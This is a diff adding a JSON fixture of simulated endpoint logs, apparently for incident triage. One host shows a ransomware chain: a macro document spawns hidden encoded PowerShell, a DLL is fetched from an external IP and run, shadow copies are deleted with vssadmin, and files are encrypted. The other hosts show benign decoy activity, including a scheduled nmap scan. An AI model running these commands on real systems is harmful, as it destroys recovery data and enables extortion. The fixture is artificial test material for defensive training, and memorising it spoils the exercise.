@@ -1,0 +1,20 @@
+{
+  "fin-ws-22": [
+    {"offset_minutes": -19, "process": "WINWORD.EXE", "user": "m.garcia", "action": "file_open", "detail": "Opened attachment Invoice_88213.docm from Outlook (sender billing@contoso-invoices.co)."},
+    {"offset_minutes": -18, "process": "powershell.exe", "parent": "WINWORD.EXE", "user": "m.garcia", "action": "process_start", "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA..."},
+    {"offset_minutes": -18, "process": "powershell.exe", "user": "m.garcia", "action": "file_download", "detail": "Downloaded http://185.220.101.47/u/upd.dll to C:\\Users\\m.garcia\\AppData\\Local\\Temp\\upd.dll", "sha256": "9f2b6c1e4d3a5b7c8e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d"},
+    {"offset_minutes": -17, "process": "rundll32.exe", "parent": "powershell.exe", "user": "m.garcia", "action": "process_start", "command_line": "rundll32.exe C:\\Users\\m.garcia\\AppData\\Local\\Temp\\upd.dll,Start"},
+    {"offset_minutes": -9, "process": "vssadmin.exe", "parent": "rundll32.exe", "user": "m.garcia", "action": "process_start", "command_line": "vssadmin.exe delete shadows /all /quiet"},
+    {"offset_minutes": -8, "process": "rundll32.exe", "user": "m.garcia", "action": "mass_file_rename", "detail": "1,842 files renamed to *.lockd in C:\\Users\\m.garcia\\Documents and F:\\ (\\\\fs-02\\finance)."},
+    {"offset_minutes": -7, "process": "rundll32.exe", "user": "m.garcia", "action": "file_create", "detail": "README_RESTORE_FILES.txt written to 63 folders."}
+  ],
+  "lt-apatel": [
+    {"offset_minutes": -300, "process": "Microsoft Edge", "user": "a.patel", "action": "process_start", "detail": "Normal browsing session from Seattle office network."}
+  ],
+  "app-07": [
+    {"offset_minutes": -240, "process": "LogRotate.exe", "user": "SYSTEM", "action": "scheduled_task", "detail": "Log rotation skipped: target share unavailable."}
+  ],
+  "scan-01": [
+    {"offset_minutes": -15, "process": "nmap", "user": "svc-scanner", "action": "process_start", "command_line": "nmap -sS -p 1-1024 10.20.0.0/16 (scheduled job CHG-4471)"}
+  ]
+}
